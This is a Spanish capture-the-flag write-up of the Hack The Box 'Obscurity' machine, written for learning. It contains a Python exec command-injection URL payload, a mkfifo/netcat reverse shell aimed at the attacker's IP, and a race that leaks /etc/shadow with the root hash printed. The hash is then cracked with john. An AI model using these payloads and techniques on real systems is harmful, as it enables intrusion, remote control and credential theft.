---
title: Hack The Box Obscurity
author: k4miyo
date: 2022-01-09
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Medium, Linux]
tags: [Injection, Cryptography, Web]
ping: true
---

## Obscurity
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.168.

```bash
❯ ping -c 1 10.10.10.168
PING 10.10.10.168 (10.10.10.168) 56(84) bytes of data.
64 bytes from 10.10.10.168: icmp_seq=1 ttl=63 time=144 ms

--- 10.10.10.168 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 143.565/143.565/143.565/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.168 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-05 22:00 CST
Initiating SYN Stealth Scan at 22:00
Scanning 10.10.10.168 [65535 ports]
Discovered open port 8080/tcp on 10.10.10.168
Discovered open port 22/tcp on 10.10.10.168
Completed SYN Stealth Scan at 22:00, 26.51s elapsed (65535 total ports)
Nmap scan report for 10.10.10.168
Host is up, received user-set (0.14s latency).
Scanned at 2022-01-05 22:00:14 CST for 27s
Not shown: 65531 filtered tcp ports (no-response), 2 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.58 seconds
           Raw packets sent: 131084 (5.768MB) | Rcvd: 22 (960B)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.168
   5   │     [*] Open ports: 22,8080
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p22,8080 10.10.10.168 -oN targeted                 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-05 22:01 CST 
Nmap scan report for 10.10.10.168
Host is up (0.14s latency).  
                                                                
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                                                                                                   |   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)                                                                   
|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)                                                                  
|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)                                                                
8080/tcp open  http-proxy BadHTTPServer                                                                                          
| fingerprint-strings:                                                                                                           
|   GetRequest:                                                                                                                  
|     HTTP/1.1 200 OK                                                                                                            
|     Date: Thu, 06 Jan 2022 04:06:39                                                                                            
|     Server: BadHTTPServer                                                                                                      
|     Last-Modified: Thu, 06 Jan 2022 04:06:39                                                                                   
|     Content-Length: 4171                                                                                                       
|     Content-Type: text/html                                                                                                    
|     Connection: Closed                                                                                                         
|     <!DOCTYPE html>                                                                                                            
|     <html lang="en">                                                                                                           
|     <head>                                                                                                                     
|     <meta charset="utf-8">                                                                                                     
|     <title>0bscura</title>                                                                                                     
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">                                                                      
|     <meta name="viewport" content="width=device-width, initial-scale=1">                                                       
|     <meta name="keywords" content="">                                                                                          
|     <meta name="description" content="">                                                                                       
|     <!--                                                                                                                       
|     Easy Profile Template                                                                                                      
|     http://www.templatemo.com/tm-467-easy-profile                                                                              
|     <!-- stylesheet css -->                                                                                                    
|     <link rel="stylesheet" href="css/bootstrap.min.css">                                                                       
|     <link rel="stylesheet" href="css/font-awesome.min.css">                                                                    
|     <link rel="stylesheet" href="css/templatemo-blue.css">                                                                     
|     </head>                                                                                                                    
|     <body data-spy="scroll" data-target=".navbar-collapse">                                                                    
|     <!-- preloader section -->                                                                                                 
|     <!--                                                                                                                       
|     <div class="preloader">                                                                                                    
|     <div class="sk-spinner sk-spinner-wordpress">
|   HTTPOptions:                                                                                                          [24/68]
|     HTTP/1.1 200 OK        
|     Date: Thu, 06 Jan 2022 04:06:40                                                                                            
|     Server: BadHTTPServer                                     
|     Last-Modified: Thu, 06 Jan 2022 04:06:40              
|     Content-Length: 4171                                      
|     Content-Type: text/html                                   
|     Connection: Closed
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>0bscura</title>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta name="keywords" content="">
|     <meta name="description" content="">
|     <!-- 
|     Easy Profile Template
|     http://www.templatemo.com/tm-467-easy-profile
|     <!-- stylesheet css -->
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/templatemo-blue.css">
|     </head>
|     <body data-spy="scroll" data-target=".navbar-collapse">
|     <!-- preloader section --> 
|     <!--
|     <div class="preloader">
|_    <div class="sk-spinner sk-spinner-wordpress">
|_http-title: 0bscura
|_http-server-header: BadHTTPServer
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https:
//nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=7%D=1/5%Time=61D66999%P=x86_64-pc-linux-gnu%r(Get
SF:Request,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x20Thu,\x2006\x20Jan\x20202
SF:2\x2004:06:39\nServer:\x20BadHTTPServer\nLast-Modified:\x20Thu,\x2006\x
SF:20Jan\x202022\x2004:06:39\nContent-Length:\x204171\nContent-Type:\x20te
SF:xt/html\nConnection:\x20Closed\n\n<!DOCTYPE\x20html>\n<html\x20lang=\"e
SF:n\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t<title>0bscura</title>\n
SF:\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=Edge\">\n\t<m
SF:eta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-sc
SF:ale=1\">\n\t<meta\x20name=\"keywords\"\x20content=\"\">\n\t<meta\x20nam
SF:e=\"description\"\x20content=\"\">\n<!--\x20\nEasy\x20Profile\x20Templa
SF:te\nhttp://www\.templatemo\.com/tm-467-easy-profile\n-->\n\t<!--\x20sty
SF:lesheet\x20css\x20-->\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/boot
SF:strap\.min\.css\">\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/font-aw
SF:esome\.min\.css\">\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/templat
SF:emo-blue\.css\">\n</head>\n<body\x20data-spy=\"scroll\"\x20data-target=
SF:\"\.navbar-collapse\">\n\n<!--\x20preloader\x20section\x20-->\n<!--\n<d
SF:iv\x20class=\"preloader\">\n\t<div\x20class=\"sk-spinner\x20sk-spinner-
SF:wordpress\">\n")%r(HTTPOptions,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x20T
SF:hu,\x2006\x20Jan\x202022\x2004:06:40\nServer:\x20BadHTTPServer\nLast-Mo
SF:dified:\x20Thu,\x2006\x20Jan\x202022\x2004:06:40\nContent-Length:\x2041
SF:71\nContent-Type:\x20text/html\nConnection:\x20Closed\n\n<!DOCTYPE\x20h
SF:tml>\n<html\x20lang=\"en\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t<
SF:title>0bscura</title>\n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20con
SF:tent=\"IE=Edge\">\n\t<meta\x20name=\"viewport\"\x20content=\"width=devi
SF:ce-width,\x20initial-scale=1\">\n\t<meta\x20name=\"keywords\"\x20conten
SF:t=\"\">\n\t<meta\x20name=\"description\"\x20content=\"\">\n<!--\x20\nEa
SF:sy\x20Profile\x20Template\nhttp://www\.templatemo\.com/tm-467-easy-prof
SF:ile\n-->\n\t<!--\x20stylesheet\x20css\x20-->\n\t<link\x20rel=\"styleshe
SF:et\"\x20href=\"css/bootstrap\.min\.css\">\n\t<link\x20rel=\"stylesheet\
SF:"\x20href=\"css/font-awesome\.min\.css\">\n\t<link\x20rel=\"stylesheet\
SF:"\x20href=\"css/templatemo-blue\.css\">\n</head>\n<body\x20data-spy=\"s
SF:croll\"\x20data-target=\"\.navbar-collapse\">\n\n<!--\x20preloader\x20s
SF:ection\x20-->\n<!--\n<div\x20class=\"preloader\">\n\t<div\x20class=\"sk
SF:-spinner\x20sk-spinner-wordpress\">\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.74 seconds
```

Vemos el puerto 8080 asociado al servicio HTTP, por lo tanto, antes de abrir el navegador, vamos a ver a lo que nos enfrentamos con `whatweb`:

```bash
❯ whatweb http://10.10.10.168:8080/
http://10.10.10.168:8080/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[secure@obscure.htb], HTML5, HTTPServer[BadHTTPServer], IP[10.10.10.168], JQuery, Script, Title[0bscura], X-UA-Compatible[IE=Edge]
```

Vemos una dirección de correo electrónico **secure@obscure.htb**, por lo que podríamos estar pensando en que se está aplicando ***Virtual Hosting***; pero antes de ver agregar el dominio a nuestro archivo `/etc/hosts`, vamos a echarle un ojo:

![](/assets/images/htb-obscurity/obscurity-web.png)

Algo que debemos de notar, es al final del sitio web, nos dicen que existe un directorio secreto en donde se encuentra un script en python llamado **SuperSecureServer.py** (podríamos agregar el dominio al archivo `/etc/hosts` y lo único que cambia son que se pueden visualizar mejor unos iconos). 

![](/assets/images/htb-obscurity/obscurity-web1.png)

De acuerdo con lo que nos indican, vamos a tratar de descubrir un directorio que contenga el archivo **SuperSecureServer.py** mediante el uso de `wfuzz`:

```bash
❯ wfuzz -c -t 200 --hc=404 --hw=367 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000004535:   200        170 L    498 W      5892 Ch     "develop"                                                       
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 63.47655
Processed Requests: 5873
Filtered Requests: 5872
Requests/sec.: 92.52235
```

Tenemos el directorio `/develop`, asi que vamos a echarle un ojo.

![](/assets/images/htb-obscurity/obscurity-web2.png)

Tenemos un programa en python y podemos visualizar el código, por lo que vamos a pasarlo a nuestro equipo para analizarlo.

```bash
❯ wget http://10.10.10.168:8080/develop/SuperSecureServer.py
--2022-01-05 22:42:02--  http://10.10.10.168:8080/develop/SuperSecureServer.py
Conectando con 10.10.10.168:8080... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 5892 (5.8K) [text/plain]
Grabando a: «SuperSecureServer.py»

SuperSecureServer.py             100%[=======================================================>]   5.75K  --.-KB/s    en 0s      

2022-01-05 22:42:02 (273 MB/s) - «SuperSecureServer.py» guardado [5892/5892]
```

Primero, vamos a tratar de buscar palabras claves que nos ayuden a ejecutar comandos a nivel de sistema, como `system` y `exec`; entre otros.

```bash
❯ cat SuperSecureServer.py | grep -i -E "system|exec"
            exec(info.format(path)) # This is how you do string formatting, right?
```

Vemos la línea `exec(info.format(path))`; pero no sabemos el valor de `path`; sin embargo, la línea anterior `info = "output = 'Document: {}'"` se observa que la variable info regresa un valor `Document:`, y si consultamos un recurso innexistente en el servidor web, tenemos lo siguiente:

![](/assets/images/htb-obscurity/obscurity-web3.png)

Aqui podemos pensar que el script gestiona las consultas hacia el servidor y lo hace validando recursos a nivel de sistema mediante el comando `exec`. Por lo tanto podríamos tratar de encontrar una forma que nos permita ejecutar comandos a nivel de sistema a través de dicho script; asi que primero vamos a importar la librería `pdb` para hacer debugin y agregaremos el inicio del programa.

```python
import socket                                                   
import threading                                                
from datetime import datetime                                   
import sys                                                      
import os                   
import mimetypes                                                                                                                 
import urllib.parse                                             
import subprocess                                                                                                                
import pdb # Nos permite hacer debugin
...
    def serveDoc(self, path, docRoot):
        path = urllib.parse.unquote(path)
        try:
            info = "output = 'Document: {}'" # Keep the output for later debug
            exec(info.format(path)) # This is how you do string formatting, right?
            pdb.set_trace() # Ponemos un break point
...
if __name__ == '__main__': # Hacemos que el flujo del programa empiece por aquí montando un servidor local en nuestro equipo
    ws = Server('127.0.0.1', 80) 
    ws.listen()
```

Vamos a ejecutar el programa y consultar cualquier recurso en nuestro navegador sobre `localhost`. 

```bash
❯ python3 SuperSecureServer.py
> /home/k4miyo/Documentos/HTB/Obscurity/content/SuperSecureServer.py(142)serveDoc()
-> cwd = os.path.dirname(os.path.realpath(__file__))
(Pdb) 
```

```bash
http://localhost/test
```

A continuación vamos a listan algunos comandos a utilizar para debugear:

- `where` - Nos indica en donde nos encontramos, en donde se realiza el break point. Para este caso, estamos en el punto antes de ejecutar la linea `cwd = os.path.dirname(os.path.realpath(__file__))`.

```bash
(Pdb) where
  /usr/lib/python3.9/threading.py(912)_bootstrap()
-> self._bootstrap_inner()
  /usr/lib/python3.9/threading.py(954)_bootstrap_inner()
-> self.run()
  /usr/lib/python3.9/threading.py(892)run()
-> self._target(*self._args, **self._kwargs)
  /home/k4miyo/Documentos/HTB/Obscurity/content/SuperSecureServer.py(90)listenToClient()
-> self.handleRequest(req, client, address)
  /home/k4miyo/Documentos/HTB/Obscurity/content/SuperSecureServer.py(106)handleRequest()
-> document = self.serveDoc(request.doc, DOC_ROOT)
> /home/k4miyo/Documentos/HTB/Obscurity/content/SuperSecureServer.py(142)serveDoc()
-> cwd = os.path.dirname(os.path.realpath(__file__))
(Pdb)
```

- `p variable` - Obtenemos el valor de la variable. Para este caso vamos a checar el valor de las variables `path` e `info` . Si observamos un poco, el valor de la variable info se encuentra entre comillas simples; esto es importante ya que podríamos tratar de cerrar las comillas simples e insertar comandos.

```bash
(Pdb) p path
'/test'
(Pdb) p info
"output = 'Document: {}'"
(Pdb) p info.format(path)
"output = 'Document: /test'"
(Pdb)
```

- `variable = ` - Cambiamos el valor de una variable. Esto lo realizaremos con el fin de ver que valor dentro del `path` nos pueden ayudar a ejecutar comando a nivel de sistema mediante la expresión `import os; os.system('whoami')`. Debido a que podriamos tener algunos problemas debido a la comillas simples y dobles, vamos a ejecutar el script y desde la ventana del explorador vamos a insertar el código.
	- `http://localhost/';os.system("whoami")'` - Observamos de respuesta `invalid syntax (<string>, line 1)`.
	- `http://localhost/";os.system('whoami')"` - Observamos de respuesta `invalid syntax (<string>, line 1)`.
	- `http://localhost/;os.system("whoami")` - El programa se ejecuta de manera normal y se detiene en donde se presenta el break point. Sin embargo, no vemos el resultado del comando.
	- `http://localhost/';os.system("whoami");'` - El programa se ejecuta de manera normal y se detiene en donde se presenta el break point y podemos ver el resultado de ejecutar el comando `whoami`. Esto se debe a que estamos escapando (`\'`) las comillas simples y nuestro código ya no es tratado como texto, si no como comandos ejecutados a nivel de sistema.

```bash
❯ python3 SuperSecureServer.py
invalid syntax (<string>, line 1)
invalid syntax (<string>, line 1)
invalid syntax (<string>, line 1)
invalid syntax (<string>, line 1)
invalid syntax (<string>, line 1)
invalid syntax (<string>, line 1)
invalid syntax (<string>, line 1)
invalid syntax (<string>, line 1)
invalid syntax (<string>, line 1)
invalid syntax (<string>, line 1)
invalid syntax (<string>, line 1)
invalid syntax (<string>, line 1)
invalid syntax (<string>, line 1)
invalid syntax (<string>, line 1)
invalid syntax (<string>, line 1)
invalid syntax (<string>, line 1)
invalid syntax (<string>, line 1)
invalid syntax (<string>, line 1)
invalid syntax (<string>, line 1)
invalid syntax (<string>, line 1)
> /home/k4miyo/Documentos/HTB/Obscurity/content/SuperSecureServer.py(142)serveDoc()
-> cwd = os.path.dirname(os.path.realpath(__file__))
(Pdb) root
> /home/k4miyo/Documentos/HTB/Obscurity/content/SuperSecureServer.py(142)serveDoc()
-> cwd = os.path.dirname(os.path.realpath(__file__))
(Pdb) p path
'/\';os.system("whoami");\''
(Pdb) p info.format(path)
'output = \'Document: /\';os.system("whoami");\'\''
(Pdb) 
```

Ya logramos obtener la sintaxis para realizar ejecución de comandos, si ejecutamos lo mismo en la máquina víctima no debemos el resultado del comando; pero como el principio es el mismo y que es posible que vía web no se nos liste los resultados, vamos a tratar de mandar un ping hacia nuestra máquina para validar.

```bash
http://10.10.10.168:8080/';os.system("ping -c 1 10.10.14.27");'
```

```bash
❯ tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
19:08:12.044640 IP obscure.htb > 10.10.14.27: ICMP echo request, id 1937, seq 1, length 64
19:08:12.044747 IP 10.10.14.27 > obscure.htb: ICMP echo reply, id 1937, seq 1, length 64
```

Ahora nos entablamos una reverse shell, así que nos ponemos en escucha por el puerto 443:

```bash
http://10.10.10.168:8080/';os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.27 443 >/tmp/f");'
```

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.168] 35894
$ whoami
www-data
$ 
```

Como siempre, vamos a hacer un [Tratamiento de la tty](/posts/tratamiento-tty) para poder trabajar más cómodos. Ahora, vemos que no podemos visualizar la flag, por lo tanto vamos a enumerar un poco el sistema para ver la forma de escalar privilegios. Si entramos al recurso `/home/robert`, vemos algunos archivos en los cuales tenemos permisos de lectura y ejecución.

```bash
www-data@obscure:/home/robert$ ls -l
total 24
drwxr-xr-x 2 root   root   4096 Dec  2  2019 BetterSSH
-rw-rw-r-- 1 robert robert   94 Sep 26  2019 check.txt
-rw-rw-r-- 1 robert robert  185 Oct  4  2019 out.txt
-rw-rw-r-- 1 robert robert   27 Oct  4  2019 passwordreminder.txt
-rwxrwxr-x 1 robert robert 2514 Oct  4  2019 SuperSecureCrypt.py
-rwx------ 1 robert robert   33 Sep 25  2019 user.txt
www-data@obscure:/home/robert$
```

Vemos un programa en python `SuperSecureCrypt.py`, así que antes de ver si código, vamos a ejecutarlo a ver que nos hace.

```bash
www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py 
################################
#           BEGINNING          #
#    SUPER SECURE ENCRYPTOR    #
################################
  ############################
  #        FILE MODE         #
  ############################
Missing args
www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -h
usage: SuperSecureCrypt.py [-h] [-i InFile] [-o OutFile] [-k Key] [-d]

Encrypt with 0bscura's encryption algorithm

optional arguments:
  -h, --help  show this help message and exit
  -i InFile   The file to read
  -o OutFile  Where to output the encrypted/decrypted file
  -k Key      Key to use
  -d          Decrypt mode
www-data@obscure:/home/robert$
```

Debido a los argmentos, así como al nombre del script, podemos intuir que nos ayuda a cifrar archivos a partir de una llave. Vamos a ver ahora el archivo `check.txt`.

```bash
www-data@obscure:/home/robert$ cat check.txt 
Encrypting this file with your key should result in out.txt, make sure your key is correct! 
www-data@obscure:/home/robert$ 
```

Aqui nos dice que el archivo `out.txt` resulta en la salida de ejecutar el script `SuperSecureCrypt.py` y de acuerdo con la sintaxis de ejecución, vemos que tenemos la posiblidad de descifrar el contenido del archivo, pero no tenemos una llave. Pensando un poco, vemos que el archivo `check.txt` podría ser una pista o una llave, así que vamos a tratar de descrifar el archivo `out.txt` utilizando como llave todo el contenido del archivo `check.txt` (**Nota**: Debido a que no tenemos permisos dentro del directorio actual, vamos a mandar la salida hacia `/dev/shm`). 

```bash
www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i out.txt -o /dev/shm/out.decrypted -k "Encrypting this file with your key should result in out.txt, make sure your key is correct!" -d
################################
#           BEGINNING          #
#    SUPER SECURE ENCRYPTOR    #
################################
  ############################
  #        FILE MODE         #
  ############################
Opening file out.txt...
Decrypting...
Writing to /dev/shm/out.decrypted...
www-data@obscure:/home/robert$ cat /dev/shm/out.decrypted 
alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichwww-data@obscure:/home/robert$ cat /dev/shm/out.decrypted ; echo
alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich<
www-data@obscure:/home/robert$
```

Tenemos una cadena de texto que se repite: `alexandrovich`; por lo que podríamos pensar que podría ser un usuario de sistema; sin embargo, no existe. Si nos damos cuenta, existe otro archivo que no hemos revisado, `passwordreminder.txt`, el cual si tratamos de leerlo tiene una apariencia similar a `out.txt`; por lo que podría ser un archivo cifrado.

```bash
www-data@obscure:/home/robert$ cat out.txt ; echo
¦ÚÈêÚÞØÛÝÝ	×ÐÊß
ÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐ
êÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäè	ÎÍÚÎëÑÓäáÛÌ×	v
www-data@obscure:/home/robert$ cat passwordreminder.txt ; echo
´ÑÈÌÉàÙÁÑé¯·¿k
www-data@obscure:/home/robert$ 
```

Lo que podríamos hacer a este punto, sería tratar de descifrar dicho archivo y utilizamos como llave `alexandrovich`.

```bash
www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i passwordreminder.txt -o /dev/shm/passwordreminder.decrypted -k "alexandrovich" -d
################################
#           BEGINNING          #
#    SUPER SECURE ENCRYPTOR    #
################################
  ############################
  #        FILE MODE         #
  ############################
Opening file passwordreminder.txt...
Decrypting...
Writing to /dev/shm/passwordreminder.decrypted...
www-data@obscure:/home/robert$ cat /dev/shm/passwordreminder.decrypted 
SecThruObsFTW
www-data@obscure:/home/robert$
```

Tenemos otra contraseña, la cual podría ser la del usuario `robert`; así que vamos a tratar de migrar a dicho usuario:

```bash
www-data@obscure:/home/robert$ su robert
Password: 
robert@obscure:~$ whoami
robert
robert@obscure:~$
```

Ya somos el usuario `robert` y podemos visualizar la flag (user.txt). Ahora vamos a enumerar un poco el sistema para ver de que forma nos podemos convertir en el usuario **root**.

```bash
robert@obscure:~$ id
uid=1000(robert) gid=1000(robert) groups=1000(robert),4(adm),24(cdrom),30(dip),46(plugdev)
robert@obscure:~$ sudo -l
Matching Defaults entries for robert on obscure:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User robert may run the following commands on obscure:
    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
robert@obscure:~$
```

Vemos que podemos ejecutar `/usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py` como el usuario propietario (**root**) sin proporcionar contraseña; así que vamos a echarle un ojo.

```bash
robert@obscure:~/BetterSSH$ cat BetterSSH.py 
import sys                     
import random, string
import os                                                                                                                        
import time                                                     
import crypt                 
import traceback  
import subprocess
                                
path = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
session = {"user": "", "authenticated": 0}
try:                                                            
    session['user'] = input("Enter username: ")
    passW = input("Enter password: ")
                                
    with open('/etc/shadow', 'r') as f:
        data = f.readlines()                                    
    data = [(p.split(":") if "$" in p else None) for p in data]
    passwords = []       
    for x in data:            
        if not x == None:
            passwords.append(x)                                 

    passwordFile = '\n'.join(['\n'.join(p) for p in passwords])  
    with open('/tmp/SSH/'+path, 'w') as f:
        f.write(passwordFile)                                   
    time.sleep(.1)
    salt = ""                  
    realPass = ""                                               
    for p in passwords:
        if p[0] == session['user']:          
            salt, realPass = p[1].split('$')[2:]
            break        
                                
    if salt == "":
        print("Invalid user")                                   
        os.remove('/tmp/SSH/'+path)
        sys.exit(0)                                             
    salt = '$6$'+salt+'$'                                       
    realPass = salt + realPass                                  
                                                                                                                                 
    hash = crypt.crypt(passW, salt)
    if hash == realPass:
        print("Authed!")
        session['authenticated'] = 1
    else:
        print("Incorrect pass")
        os.remove('/tmp/SSH/'+path)
        sys.exit(0)
    os.remove(os.path.join('/tmp/SSH/',path))
except Exception as e:
    traceback.print_exc()
    sys.exit(0)

if session['authenticated'] == 1:
    while True:
        command = input(session['user'] + "@Obscure$ ")
        cmd = ['sudo', '-u',  session['user']]
        cmd.extend(command.split(" "))
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        o,e = proc.communicate()
        print('Output: ' + o.decode('ascii'))
        print('Error: '  + e.decode('ascii')) if len(e.decode('ascii')) > 0 else print('')
robert@obscure:~/BetterSSH$
```

Analizando un poco al script, vemos que dentro del directorio `/tmp/SSH/` se guarda una copia de lo que existe en `/etc/shadow` de una forma parseada y a partir de dicha información, valida si el usuario y contraseña que introduzcamos coinciden o no. Además, si las credenciales son incorrectas, los archivos son borrados. Por lo tanto, vamos primero a conectarnos a través de ssh como el usuario `robert`:

```bash
❯ ssh robert@10.10.10.168
The authenticity of host '10.10.10.168 (10.10.10.168)' can't be established.
ECDSA key fingerprint is SHA256:H6t3x5IXxyijmFEZ2NVZbIZHWZJZ0d1IDDj3OnABJDw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.168' (ECDSA) to the list of known hosts.
robert@10.10.10.168's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jan 10 02:03:06 UTC 2022

  System load:  0.08              Processes:             112
  Usage of /:   45.8% of 9.78GB   Users logged in:       0
  Memory usage: 16%               IP address for ens160: 10.10.10.168
  Swap usage:   0%


40 packages can be updated.
0 updates are security updates.


Last login: Mon Dec  2 10:23:36 2019 from 10.10.14.4
robert@obscure:~$
```

En esta sesión, vamos a ejecutar un bucle que nos permita leer todo lo que se encuentre en la ruta `/tmp/SSH` y en la sesión que obtuvimos por una reverse shell vamos a ejecutar el comando que se nos indica.

```bash
robert@obscure:~/BetterSSH$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
Enter username: test
Enter password: test
Invalid user
robert@obscure:~/BetterSSH$
```

```bash
robert@obscure:/tmp/SSH$ while true; do cat *; done 2>/dev/null                                                                  
root                                                                                                                             
$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1                               
18226                                                                                                                            
0                                                                                                                                
99999                                                                                                                            
7                                                                                                                                
                                                                                                                                 
                                                                                                                                 
                                                                                                                                 
                                                                                                                                 
robert                                                                                                                           
$6$fZZcDG7g$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/                               
18163                                                                                                                            
0                                                                                                                                
99999                                                                                                                            
7 
```

Ya tenemos el hash del usuario **root**; por lo que vamos a tratar de crackearlo (El archivo `hash` contiene el hash del usuario **root** de la máquina víctima).

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mercedes         (?)
1g 0:00:00:00 DONE (2022-01-09 20:02) 5.263g/s 5389p/s 5389c/s 5389C/s 123456..bethany
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Ya tenemos la contraseña, por lo tanto podríamos migrar al usuario **root**:

```bash
robert@obscure:~/BetterSSH$ su root
Password: 
root@obscure:/home/robert/BetterSSH# whoami
root
root@obscure:/home/robert/BetterSSH#
```

Ya somos el usuario **root** y podemos visualizar la flag (root.txt).
